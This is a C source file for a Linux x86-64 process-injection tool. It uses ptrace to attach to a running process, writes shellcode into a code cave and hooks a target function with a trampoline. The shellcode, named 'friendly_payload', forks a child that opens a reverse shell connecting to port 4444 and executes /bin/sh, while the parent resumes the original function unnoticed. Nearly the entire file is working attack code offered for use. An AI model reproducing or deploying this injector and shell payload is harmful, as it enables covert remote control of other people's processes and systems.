#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <errno.h>
#include <stdint.h>

#define MIN_HOOK_SIZE 5  // Minimum bytes needed for JMP instruction

// 64-bit shell payload (based on your working 32-bit version)
unsigned char friendly_payload[] = {
    // fork() first - child does shell, parent continues
    0x6a, 0x39,                     // push 57 (sys_fork)
    0x58,                           // pop rax
    0x0f, 0x05,                     // syscall

    // if parent, skip to trampoline
    0x48, 0x85, 0xc0,               // test rax, rax
    0x75, 0x00,                     // jnz <to_be_patched> (rel8 palceholder)

    // === CHILD: SHELL ===

    // socket(AF_INET, SOCK_STREAM, 0)
    0x6a, 0x29,                     // push 41 (sys_socket)
    0x58,                           // pop rax
    0x6a, 0x02,                     // push 2 (AF_INET)
    0x5f,                           // pop rdi
    0x6a, 0x01,                     // push 1 (SOCK_STREAM)
    0x5e,                           // pop rsi
    0x99,                           // cdq (rdx = 0)
    0x0f, 0x05,                     // syscall
    0x48, 0x89, 0xc7,               // mov rdi, rax (save sockfd)

    // Build sockaddr_in on stack
    0x52,                           // push rdx
    0x52,                           // push rdx
    0x66, 0xc7, 0x04, 0x24, 0x02, 0x00,           // mov word [rsp], 0x0002   ; AF_INET
    0x66, 0xc7, 0x44, 0x24, 0x02, 0x11, 0x5c,     // mov word [rsp+2], 0x5c11 ; htons(4444)
    0xc7, 0x44, 0x24, 0x04, 0x7f, 0x00, 0x00, 0x01, // mov dword [rsp+4], 0x0100007f ; 127.0.0.1

    // connect(sockfd, &sockaddr, 16)
    0x48, 0x89, 0xe6,               // mov rsi, rsp
    0x6a, 0x10,                     // push 16
    0x5a,                           // pop rdx
    0x6a, 0x2a,                     // push 42 (sys_connect)
    0x58,                           // pop rax
    0x0f, 0x05,                     // syscall

    // dup2 loop: stdin/stdout/stderr
    0x6a, 0x03,                     // push 3
    0x5e,                           // pop rsi
    // dup_loop:
    0x48, 0xff, 0xce,               // dec rsi
    0x6a, 0x21,                     // push 33 (sys_dup2)
    0x58,                           // pop rax
    0x0f, 0x05,                     // syscall
    0x75, 0xf6,                     // jnz dup_loop

    // execve("/bin//sh", ["/bin//sh"], NULL)
    0x99,                           // cdq
    0x52,                           // push rdx
    0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68,  // movabs rbx, "//sh\x00nib/"
    0x53,                           // push rbx
    0x48, 0x89, 0xe7,               // mov rdi, rsp
    0x52,                           // push rdx
    0x57,                           // push rdi
    0x48, 0x89, 0xe6,               // mov rsi, rsp
    0x6a, 0x3b,                     // push 59 (sys_execve)
    0x58,                           // pop rax
    0x0f, 0x05,                     // syscall

    // === PARENT: TRAMPOLINE ===
    // parent_path:
    // Space for stolen bytes (will be filled at injection time)
    0x90, 0x90, 0x90, 0x90, 0x90,   // nop x5 (placeholder for stolen instructions)
    0x90, 0x90, 0x90, 0x90, 0x90,   // nop x5 (extra space if needed)
    0x90, 0x90, 0x90, 0x90, 0x90,   // nop x5 (extra space if needed)

    // Jump back to original function
    0x48, 0xb8,                     // movabs rax, imm64
    0x00, 0x00, 0x00, 0x00,         // [return address - will be patched]
    0x00, 0x00, 0x00, 0x00,
    0xff, 0xe0,                     // jmp rax
};

// Simple instruction length decoder for x86-64
// Returns the length of the instruction at 'bytes'
int calc_instr_len(unsigned char *bytes)
{
    // Special-case common prologue first, before stripping prefixes
    if (bytes[0] == 0x48 && bytes[1] == 0x83 && bytes[2] == 0xec)
        return 4;  // 48 83 ec XX

    if (bytes[0] == 0x48 && bytes[1] == 0x81 && bytes[2] == 0xec)
        return 7;  // 48 81 ec XX XX XX XX

    unsigned char opcode = bytes[0];
    int offset = 0;

    while (opcode == 0x66 || opcode == 0x67 ||
           opcode == 0xf0 || opcode == 0xf2 || opcode == 0xf3 ||
           (opcode >= 0x40 && opcode <= 0x4f)) // REX
    {
        offset++;
        opcode = bytes[offset];
    }

    // Common single-byte instructions
    if (opcode == 0x50 || opcode == 0x51 || opcode == 0x52 || opcode == 0x53 ||
        opcode == 0x54 || opcode == 0x55 || opcode == 0x56 || opcode == 0x57)  // push reg
        return offset + 1;

    if (opcode == 0x58 || opcode == 0x59 || opcode == 0x5a || opcode == 0x5b ||
        opcode == 0x5c || opcode == 0x5d || opcode == 0x5e || opcode == 0x5f)  // pop reg
        return offset + 1;

    if (opcode == 0x90)  // nop
        return offset + 1;

    if (opcode == 0xc3 || opcode == 0xcb)  // ret
        return offset + 1;

    // Two-byte opcodes starting with 0x0f
    if (opcode == 0x0f)
        return offset + 2 + 1;  // Simplified - many 0f opcodes need ModR/M

    // MOV instructions (0x89, 0x8b with ModR/M)
    if (opcode == 0x89 || opcode == 0x8b)
    {
        unsigned char modrm = bytes[offset + 1];
        int mod = (modrm >> 6) & 3;

        if (mod == 3)  // Register-to-register
            return offset + 2;
        else if (mod == 0)  // [reg]
            return offset + 2;
        else if (mod == 1)  // [reg + disp8]
            return offset + 3;
        else  // mod == 2: [reg + disp32]
            return offset + 6;
    }

    // SUB rsp, imm (common in prologues)
    if (opcode == 0x48 && bytes[offset + 1] == 0x83 && bytes[offset + 2] == 0xec)
        return offset + 4;  // 48 83 ec XX

    if (opcode == 0x48 && bytes[offset + 1] == 0x81 && bytes[offset + 2] == 0xec)
        return offset + 7;  // 48 81 ec XX XX XX XX

    // MOV with immediate
    if (opcode >= 0xb8 && opcode <= 0xbf)  // mov reg, imm32
        return offset + 5;

    if (opcode == 0x48 && bytes[offset + 1] >= 0xb8 && bytes[offset + 1] <= 0xbf)  // movabs reg, imm64
        return offset + 10;

    // Default fallback (not safe for production!)
    return 5;
}

// Find code cave in executable memory
void *locate_code_cave(pid_t target_pid, size_t needed_size)
{
    char map_path[256];
    snprintf(map_path, sizeof(map_path), "/proc/%d/maps", target_pid);

    FILE *maps_file = fopen(map_path, "r");
    if (!maps_file) return NULL;

    char line[512];
    void *found_addr = NULL;

    while (fgets(line, sizeof(line), maps_file))
    {
        unsigned long start, end;
        char perms[5];

        if (sscanf(line, "%lx-%lx %4s", &start, &end, perms) == 3)
        {
            if (perms[0] == 'r' && perms[2] == 'x' && perms[3] == 'p')
            {
                size_t region_size = end - start;
                if (region_size > needed_size + 0x1000 && strstr(line, "target"))
                {
                    found_addr = (void *)(end - needed_size - 0x100);
                    break;
                }
            }
        }
    }

    fclose(maps_file);
    return found_addr;
}

int main(int argc, char *argv[])
{
    if (argc != 3)
    {
        printf("Usage: %s <pid> <function_address_hex>\n", argv[0]);
        return 1;
    }

    pid_t target_pid = atoi(argv[1]);
    unsigned long target_func_addr = strtoul(argv[2], NULL, 16);

    printf("\n");
    printf("================================================\n");
    printf("  Proper Inline Hook with Trampoline\n");
    printf("================================================\n");
    printf("\n");
    printf("[*] Target PID: %d\n", target_pid);
    printf("[*] Target Function: 0x%lx\n", target_func_addr);

    // STEP 1: Attach to target process
    printf("\n[*] Attaching...\n");
    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) < 0)
    {
        perror("ptrace attach");
        return 1;
    }

    int wait_status;
    waitpid(target_pid, &wait_status, 0);
    printf("[+] Attached\n");

    // STEP 2: Read first 20 bytes of target function (to find instruction boundaries)
    printf("\n[*] Reading function bytes...\n");
    unsigned char original_bytes[20];

    for (int i = 0; i < 20; i += sizeof(long))
    {
        errno = 0;
        long word = ptrace(PTRACE_PEEKDATA, target_pid, (void *)(target_func_addr + i), NULL);
        if (errno != 0)
        {
            perror("ptrace peek");
            ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
            return 1;
        }
        memcpy(&original_bytes[i], &word, sizeof(long));
    }

    printf("    First 20 bytes:");
    for (int i = 0; i < 20; i++)
        printf(" %02x", original_bytes[i]);
    printf("\n");

    // STEP 3: Determine how many bytes we need to "steal" for the JMP
    printf("\n[*] Determining instruction boundaries...\n");
    int stolen_len = 0;
    int instr_count = 0;

    while (stolen_len < MIN_HOOK_SIZE)
    {
        int len = calc_instr_len(&original_bytes[stolen_len]);
        printf("    Instruction %d: %d bytes\n", instr_count + 1, len);
        stolen_len += len;
        instr_count++;
    }

    printf("[+] Need to steal %d bytes (%d instructions)\n", stolen_len, instr_count);

    if (stolen_len > 15)
    {
        printf("[!] Too many bytes to steal - function too complex\n");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return 1;
    }

    // STEP 4: Find a code cave in the target (where we'll put the trampoline/payload)
    void *cave_addr = locate_code_cave(target_pid, sizeof(friendly_payload));
    if (!cave_addr)
    {
        printf("[-] No code cave found\n");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return 1;
    }
    printf("[+] Using code cave at: %p\n", cave_addr);

    // STEP 5: Patch payload with stolen bytes and return address
    //         (trampoline_nop_offset points at the NOP area inside friendly_payload)
    size_t trampoline_nop_offset = sizeof(friendly_payload) - 25;  // Location of NOPs
    memcpy(&friendly_payload[trampoline_nop_offset], original_bytes, stolen_len);

    unsigned long resume_address = target_func_addr + stolen_len;
    memcpy(&friendly_payload[sizeof(friendly_payload) - 10], &resume_address, 8);

    printf("[*] Trampoline will jump back to: 0x%lx\n", resume_address);

    // STEP 6: >>> THIS IS WHERE THE JNZ REL8 PATCH GOES <<<
    //
    // At this point, you know:
    //   - cave_addr              : runtime base address of the payload in target
    //   - trampoline_nop_offset  : offset inside friendly_payload of the parent trampoline
    //   - stolen_len             : how many bytes you copied there
    //
    // This is the place to:
    //   - find the 0x75 0x00 (jnz placeholder) inside friendly_payload
    //   - compute the rel8 displacement:
    //         rel = parent_start - (address_after_jnz)
    //     where:
    //         parent_start = cave_addr + trampoline_nop_offset
    //         address_after_jnz = (cave_addr + jnz_off + 2)
    //   - check that -128 <= rel <= 127
    //   - write rel into friendly_payload[jnz_off + 1]
    //
    // PSEUDOCODE:
    //
    //   size_t jnz_off = ... find 0x75 0x00 ...
    //   unsigned char *parent_start = (unsigned char *)cave_addr + trampoline_nop_offset;
    //   unsigned char *jnz_runtime  = (unsigned char *)cave_addr + jnz_off;
    //   unsigned char *next_instr   = jnz_runtime + 2;
    //   intptr_t rel = (intptr_t)(parent_start - next_instr);
    //   friendly_payload[jnz_off + 1] = (int8_t)rel;
    //
    // Drop your concrete implementation of that logic here:
    // Find the jnz (0x75 0x00) in the payload
    size_t jnz_off = (size_t)-1;
    for (size_t i = 0; i + 1 < sizeof(friendly_payload); ++i) {
        if (friendly_payload[i] == 0x75 && friendly_payload[i+1] == 0x00) {
            jnz_off = i;
            break;
        }
    }
    if (jnz_off == (size_t)-1) {
        fprintf(stderr, "[!] jnz placeholder not found in payload\n");
        // handle error / abort
    }

    // Where does the parent trampoline start (runtime address)?
    unsigned char *parent_start =
        (unsigned char *)cave_addr + trampoline_nop_offset;

    // Runtime address of this jnz and its "next instruction"
    unsigned char *jnz_runtime = (unsigned char *)cave_addr + jnz_off;
    unsigned char *next_instr  = jnz_runtime + 2; // jnz rel8 is 2 bytes

    // rel8: target = next_instr + rel8
    intptr_t rel = (intptr_t)(parent_start - next_instr);

    if (rel < -128 || rel > 127) {
        fprintf(stderr, "[!] jnz target out of rel8 range: %ld\n", (long)rel);
        // handle error (layout too big, fall back to different scheme, etc.)
    }

    // Patch the displacement byte *in the payload* before injecting it
    friendly_payload[jnz_off + 1] = (int8_t)rel;
    
    ///////////////// STEP 6 IMPLEMENTATION ABOVE ////////////////


    // STEP 7: Write patched payload into the code cave
    printf("\n[*] Writing payload (%zu bytes)...\n", sizeof(friendly_payload));
    for (size_t i = 0; i < sizeof(friendly_payload); i += sizeof(long))
    {
        long sc_word = 0;
        size_t chunk = sizeof(long);
        if (i + chunk > sizeof(friendly_payload))
            chunk = sizeof(friendly_payload) - i;

        memcpy(&sc_word, &friendly_payload[i], chunk);

        if (ptrace(PTRACE_POKEDATA, target_pid, cave_addr + i, sc_word) < 0)
        {
            perror("ptrace poke payload");
            ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
            return 1;
        }
    }
    printf("[+] Payload written\n");

    // STEP 8: Build JMP instruction at the original function entry
    int32_t jmp_relative = (int32_t)((int64_t)cave_addr - (int64_t)target_func_addr - 5);
    unsigned char jmp_inst[5];
    jmp_inst[0] = 0xe9;
    memcpy(&jmp_inst[1], &jmp_relative, 4);

    printf("\n[*] Installing hook...\n");
    printf("    Offset: 0x%x\n", jmp_relative);
    printf("    JMP bytes:");
    for (int i = 0; i < 5; i++)
        printf(" %02x", jmp_inst[i]);
    printf("\n");

    // Pad overwritten bytes with NOPs beyond the JMP
    unsigned char patch_bytes[15] = {0};
    memcpy(patch_bytes, jmp_inst, 5);
    for (int i = 5; i < stolen_len; i++)
        patch_bytes[i] = 0x90;  // NOP

    // STEP 9: Write hook into the original function prologue
    for (int i = 0; i < stolen_len; i += sizeof(long))
    {
        long orig_word = ptrace(PTRACE_PEEKDATA, target_pid, (void *)(target_func_addr + i), NULL);
        long patched_word = orig_word;

        int bytes_to_write = (i + sizeof(long) > stolen_len) ? stolen_len - i : sizeof(long);
        memcpy(&patched_word, &patch_bytes[i], bytes_to_write);

        if (ptrace(PTRACE_POKEDATA, target_pid, (void *)(target_func_addr + i), patched_word) < 0)
        {
            perror("ptrace poke hook");
            ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
            return 1;
        }
    }

    // STEP 10: Verify the hook bytes at the function entry
    long verify_word = ptrace(PTRACE_PEEKDATA, target_pid, (void *)target_func_addr, NULL);
    unsigned char *verify_bytes = (unsigned char *)&verify_word;
    printf("    Verification:");
    for (int i = 0; i < stolen_len && i < 8; i++)
        printf(" %02x", verify_bytes[i]);
    printf("\n");

    // STEP 11: Detach from target
    ptrace(PTRACE_DETACH, target_pid, NULL, NULL);

    printf("\n");
    printf("================================================\n");
    printf("  Hook Installed!\n");
    printf("================================================\n");
    printf("\n");
    printf("When function is called:\n");
    printf("  - Forks immediately\n");
    printf("  - Child follows payload child-path logic\n");
    printf("  - Parent executes trampoline and continues normally\n");
    printf("\n");

    return 0;
}